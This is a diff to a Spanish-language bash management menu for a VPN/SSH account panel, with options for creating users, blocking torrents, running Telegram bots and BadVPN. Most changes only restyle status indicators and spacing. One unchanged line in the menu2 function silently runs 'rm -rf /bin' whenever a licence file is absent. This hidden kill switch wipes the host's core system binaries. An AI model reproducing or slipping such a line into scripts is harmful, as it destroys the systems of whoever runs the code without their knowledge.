@@ -193,10 +193,10 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON◉) ") || stsf=$(echo -e "\033[1;31m(OFF) ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
-stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
-stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON💚) ") || stsf=$(echo -e "\033[1;31m(OFF💔) ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
+stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
@@ -240,18 +240,18 @@ echo -e "\033[1;31m════════════════════�
     echo -e "\033[1;31m         \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mEXISTE UNA ATUALIZACION DISPONIBLE  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m        \033[1;31m"
     var01="\033[1;32m!"
 }
-echo -e "\033[1;31m══════════════════════════════════\033[0m"
-echo -e "\033[1;31m  \033[1;32mMEMÓRIA SWAP    \033[1;36mT: \033[1;37m$swap1  \033[1;36mEn uso: \033[1;37m$swap3  \033[1;36mLibre: \033[1;37m$swap2 \033[1;31m"
-echo -e "\033[1;31m══════════════════════════════════\033[0m"
-echo -e "\033[1;31m  [\033[1;36m21\033[1;31m] \033[1;37m \033[1;33mADICIONAR HOST \033[1;31m  [\033[1;36m28\033[1;31m] \033[1;37m \033[1;33mEDITAR CONTRASEÑA ROOT \033[1;31m  \033[1;31m  
-\033[1;31m [\033[1;36m22\033[1;31m] \033[1;37m \033[1;33mBORRAR HOST \033[1;31m      [\033[1;36m29\033[1;31m] \033[1;37m \033[1;33mAUTO INICIO $autm \033[1;31m
-\033[1;31m  [\033[1;36m23\033[1;31m] \033[1;37m \033[1;33mREINICIAR SISTEMA \033[1;31m   [\033[1;36m30\033[1;31m] $var01 \033[1;33mACTUALIZAR SCRIPT \033[1;31m  \033[1;31m
-\033[1;31m  [\033[1;36m24\033[1;31m] \033[1;37m \033[1;33mREINICIAR SERVICOS \033[1;31m  [\033[1;36m31\033[1;31m] \033[1;37m \033[1;33mBORRAR SCRIPT \033[1;31m  \033[1;31m 
-\033[1;31m   [\033[1;36m25\033[1;31m] \033[1;37m \033[1;33mBLOCK TORRENT $stsf\033[1;31m [\033[1;36m32\033[1;31m] \033[1;37m \033[1;33mTCPTWEAKER  \033[1;31m  \033[1;31m
-\033[1;31m   [\033[1;36m26\033[1;31m] \033[1;37m \033[1;33mBOT TELEGRAM $stsbot\033[1;31m  [\033[1;36m33\033[1;31m] \033[1;37m \e[1;33mVOLVER \e[1;31m
-\e[1;31m  [\e[1;36m27\e[1;31m] \033[1;37m \033[1;33mBOT TESTE $stsbotteste\033[1;31m    [\033[1;36m00\033[1;31m] \033[1;37m \033[1;33mSALIR \033[1;31m  "
-echo -e "\033[1;31m════════════════════════════════\033[0m"
-echo -ne "\033[1;31m\033[1;32m INFORME UNA OPCION \033[1;33m:"; read x
+echo -e "\033[1;31m══════════════════════════════════\e[0m"
+echo -e "\e[1;31m \e[1;32mMEMORIA SWAP\e[1;36mT:\e[1;37m$swap1  \e[1;36mEn uso:\e[1;37m$swap3  \e[1;36mLibre:\e[1;37m$swap2\e[1;31m"
+echo -e "\e[1;31m══════════════════════════════════\e[0m"
+echo -e "\e[1;31m  [\e[1;36m21\e[1;31m]\e[1;37m\e[1;33mADICIONAR HOST \e[1;31m    [\e[1;36m28\e[1;31m]\e[1;37m\e[1;33mEDITAR CONTRASEÑA ROOT \e[1;31m \e[1;31m  
+\e[1;31m [\e[1;36m22\e[1;31m]\e[1;37m\e[1;33mBORRAR HOST \e[1;31m        [\e[1;36m29\e[1;31m]\e[1;37m\e[1;33mAUTO INICIO $autm \e[1;31m
+\e[1;31m  [\e[1;36m23\e[1;31m]\e[1;37m\e[1;33mREINICIAR SISTEMA \e[1;31m   [\e[1;36m30\e[1;31m]$var01\e[1;33mACTUALIZAR SCRIPT\e[1;31m  \e[1;31m
+\e[1;31m  [\e[1;36m24\e[1;31m]\e[1;37m\e[1;33mREINICIAR SERVICOS \e[1;31m  [\e[1;36m31\e[1;31m] \e[1;37m\e[1;33mBORRAR SCRIPT \e[1;31m  \e[1;31m 
+\e[1;31m   [\e[1;36m25\e[1;31m]\e[1;37m\e[1;33mBLOCK TORRENT $stsf\e[1;31m [\e[1;36m32\e[1;31m]\e[1;37m \e[1;33mTCPTWEAKER  \e[1;31m  \e[1;31m
+\e[1;31m   [\e[1;36m26\e[1;31m]\e[1;37m\e[1;33mBOT TELEGRAM $stsbot\e[1;31m  [\e[1;36m33\e[1;31m] \e[1;37m \e[1;33mVOLVER \e[1;31m
+\e[1;31m  [\e[1;36m27\e[1;31m] \e[1;37m\e[1;33mBOT TESTE $stsbotteste\e[1;31m    [\e[1;36m00\e[1;31m]\e[1;37m \e[1;33mSALIR \e[1;31m  "
+echo -e "\e[1;31m════════════════════════════════\e[0m"
+echo -ne "\e[1;31m\e[1;32m INFORME UNA OPCION \e[1;33m:"; read x
 case "$x" in
    21)
    clear
@@ -318,9 +318,9 @@ esac
 }
 while true $x != "ok"
 do
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
-stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON💚) " || echo -e "\033[1;31m(OFF💔) ")
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -357,18 +357,18 @@ echo -e "\033[1;31m  \033[1;36mPais: \033[1;37mAR🇦🇷  \033[1;31m  \033[1;36
 echo -e "\033[1;31m═══════════════════════════════════\033[0m"
 echo -e "\033[1;31m \033[1;32mOnlines:\033[1;37m$_onlin \033[1;31m  \033[1;32mExpirados: \033[1;37m$_userexp \033[1;31m  \033[1;32mTotal: \033[1;37m$_tuser \033[1;31m"
 echo -e "\033[1;31m════════════════════════════════════\033[0m"
-echo -e "\e[1;31m  \e[1;31m[\e[1;36m01\e[1;31m]\e[1;37m\e[1;33mCRYAR USUARIO \e[1;31m         [\e[1;36m12\e[1;31m]\e[1;37m\e[1;33mSPEEDTEST\e[1;31m     
-\e[1;31m  [\e[1;36m02\e[1;31m]\e[1;37m\e[1;33mCREAR TESTE\e[1;31m         [\e[1;36m13\e[1;31m]\e[1;37m\e[1;33mBANNER\e[1;31m   
-\e[1;31m  [\e[1;36m03\e[1;31m]\e[1;37m\e[1;37m\e[1;33mBORRAR USUARIO\e[1;31m         [\e[1;36m14\e[1;31m]\e[1;37m\e[1;33mTRAFEGO\e[1;31m       
-\e[1;31m  [\e[1;36m04\e[1;31m]\e[1;37m\e[1;33mMONITOR ONLINE\e[1;31m       [\e[1;36m15\e[1;31m]\e[1;37m\e[1;33mOPTIMIZAR\e[1;31m  
-\e[1;31m   [\e[1;36m05\e[1;31m]\e[1;37m\e[1;33mEDITAR FECHA\e[1;31m          [\e[1;36m16\e[1;31m]\e[1;37m\e[1;33mBACKUP\e[1;31m  
-\e[1;31m   [\e[1;36m06\e[1;31m]\e[1;37m \e[1;33mEDITAR LIMITE\e[1;31m        [\e[1;36m17\e[1;31m]\e[1;37m\e[1;33mHERRAMIENTAS\e[1;31m   
-\e[1;31m  [\e[1;36m07\e[1;31m] \e[1;37m \e[1;33mEDITAR CONTRASEÑA \e[1;31m     [\e[1;36m18\e[1;31m] \e[1;37m \e[1;33mLIMITER $stsl\e[1;31m   
-\e[1;31m  [\e[1;36m08\e[1;31m]\e[1;37m\e[1;33mBORRAR EXPIRADOS\e[1;31m       [\e[1;36m19\e[1;31m]\e[1;37m\e[1;33mMenu BadVpn $stsu\e[1;31m
-\e[1;31m  [\e[1;36m09\e[1;31m]\e[1;37m\e[1;33mINFO DE USUARIOS\e[1;31m       [\e[1;36m20\e[1;31m]\e[1;37m\e[1;33mFIREWALL (PRO)\e[1;31m  
-\e[1;31m  [\e[1;36m10\e[1;31m]\e[1;37m \e[1;33mMENU INSTALADOR\e[1;31m       [\e[1;36m21\e[1;31m]\e[1;37m \e[1;33mINFO VPS\e[0m\e[1;31m   
-\e[1;31m  [\e[1;36m11\e[1;31m]\e[1;37m\e[1;33mSALIR \e[1;31m       [\e[1;36m22\e[1;31m]\e[1;37m\e[1;33mCHECKUSER 4G\e[1;31m   
-\e[1;31m  [\e[1;36mG\e[1;31m]\e[1;37m\e[1;33mCHECKUSER GLTUNNEL \e[1;31m     [\e[1;36m23\e[1;31m]\e[1;37m\e[1;33m M A S \e[0m\e[1;31m        "
+echo -e "\e[1;31m  \e[1;31m[\e[1;36m01\e[1;31m]\e[1;37m\e[1;33mCRYAR USUARIO \e[1;31m        [\e[1;36m12\e[1;31m]\e[1;37m \e[1;33mSPEEDTEST\e[1;31m     
+\e[1;31m  [\e[1;36m02\e[1;31m]\e[1;37m\e[1;33mCREAR TESTE\e[1;31m           [\e[1;36m13\e[1;31m]\e[1;37m\e[1;33mBANNER\e[1;31m   
+\e[1;31m  [\e[1;36m03\e[1;31m]\e[1;37m\e[1;37m\e[1;33mBORRAR USUARIO\e[1;31m        [\e[1;36m14\e[1;31m]\e[1;37m\e[1;33m TRAFEGO \e[1;31m       
+\e[1;31m  [\e[1;36m04\e[1;31m]\e[1;37m\e[1;33mMONITOR ONLINE\e[1;31m        [\e[1;36m15\e[1;31m]\e[1;37m\e[1;33mOPTIMIZAR\e[1;31m  
+\e[1;31m  [\e[1;36m05\e[1;31m]\e[1;37m\e[1;33mEDITAR FECHA\e[1;31m          [\e[1;36m16\e[1;31m]\e[1;37m\e[1;33mBACKUP\e[1;31m  
+\e[1;31m  [\e[1;36m06\e[1;31m]\e[1;37m\e[1;33mEDITAR LIMITE\e[1;31m         [\e[1;36m17\e[1;31m]\e[1;37m\e[1;33mHERRAMIENTAS\e[1;31m   
+\e[1;31m  [\e[1;36m07\e[1;31m]\e[1;37m\e[1;33mEDITAR CONTRASEÑA \e[1;31m    [\e[1;36m18\e[1;31m]\e[1;37m\e[1;33mLIMITER $stsl\e[1;31m   
+\e[1;31m  [\e[1;36m08\e[1;31m]\e[1;37m\e[1;33mBORRAR EXPIRADOS\e[1;31m      [\e[1;36m19\e[1;31m]\e[1;37m\e[1;33mMenu BadVpn $stsu\e[1;31m
+\e[1;31m  [\e[1;36m09\e[1;31m]\e[1;37m\e[1;33mINFO DE USUARIOS\e[1;31m      [\e[1;36m20\e[1;31m]\e[1;37m\e[1;33mFIREWALL (PRO)\e[1;31m  
+\e[1;31m  [\e[1;36m10\e[1;31m]\e[1;37m\e[1;33mMENU INSTALADOR\e[1;31m       [\e[1;36m21\e[1;31m]\e[1;37m\e[1;33mINFO VPS\e[0m\e[1;31m   
+\e[1;31m  [\e[1;36m11\e[1;31m]\e[1;37m\e[1;33mSALIR \e[1;31m                [\e[1;36m22\e[1;31m]\e[1;37m\e[1;33mCHECKUSER 4G\e[1;31m   
+\e[1;31m  [\e[1;36mG\e[1;31m]\e[1;37m\e[1;33mCHECKUSER GLTUNNEL \e[1;31m    [\e[1;36m23\e[1;31m]\e[1;37m\e[1;33m M A S \e[0m\e[1;31m        "
 echo -e "\e[1;31m═══════════════════════════════════\e[0m"
 echo -ne "\e[1;31m\e[1;32m ....INFORME UNA OPCION \e[1;33m:"; read x
 
